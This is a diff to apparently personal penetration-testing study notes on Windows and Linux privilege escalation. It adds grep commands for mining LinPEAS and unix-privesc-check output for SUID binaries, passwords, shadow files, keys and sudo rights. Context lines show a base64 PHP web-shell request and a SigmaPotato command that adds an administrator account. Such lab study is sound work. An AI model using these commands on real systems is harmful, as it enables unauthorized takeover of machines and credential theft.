@@ -961,7 +961,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
 
 # Linux priviledge  
-- Automated Tool - LinPEAS.sh
+- 🖥️ **Automated Tool - LinPEAS.sh**
   - https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293
   - transfer linpeas.sh and execute
     ```
@@ -974,6 +974,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     ./linpeas.sh | tee linpeas_output.txt
     ```
   - Analyze red/yellow font
+    - `grep -E "WARNING|CRITICAL|SUID|password|sudo" linpeas.txt`
+    - `grep --color=always -i "sudo" linpeas.txt` (sudo, suid, capabilities, cron, password, writeable, service, ssh, kernel)
     - SUID - Check easy privesc, exploits and write perms (E.g /usr/bin/find).
       - `/usr/bin/find` > Exploit with GTFOBins
     - Check for vulnerable cron jobs
@@ -995,8 +997,35 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - **Automation - unix-privesc-check**
     - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
     - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.196.214:/home/joe`  
-    - `joe@debian-privesc:~$ ./upc.sh standard > unix-privesc-check.txt`  
-    - Look for writable files "WARNING:"  
+    - `joe@debian-privesc:~$ ./unix-privesc-check standard > unix-privesc-check.txt`  
+    - Look for writable files "WARNING:"
+    - Useful grep
+      ```
+      # SUID/SGID binaries (potential privesc)
+      grep -i "suid" unix-privesc-check.txt
+      grep -i "sgid" unix-privesc-check.txt
+      
+      # World-writable / weak permissions
+      grep -i "write" unix-privesc-check.txt
+      grep -i "writable" unix-privesc-check.txt
+      
+      # Config files, passwords, keys
+      grep -i "password" unix-privesc-check.txt
+      grep -i "shadow" unix-privesc-check.txt
+      grep -i "key" unix-privesc-check.txt
+      
+      # Services, jobs, scripts
+      grep -i "cron" unix-privesc-check.txt
+      grep -i "service" unix-privesc-check.txt
+      grep -i "rc.d" unix-privesc-check.txt
+      
+      # Network capabilities / setcap
+      grep -i "cap" unix-privesc-check.txt
+      
+      # Users & sudo
+      grep -i "sudo" unix-privesc-check.txt
+      grep -i "uid" unix-privesc-check.txt
+      ```
 - Exposed Credential Info  
   - Env variables  
     `joe@debian-privesc:~$ env`
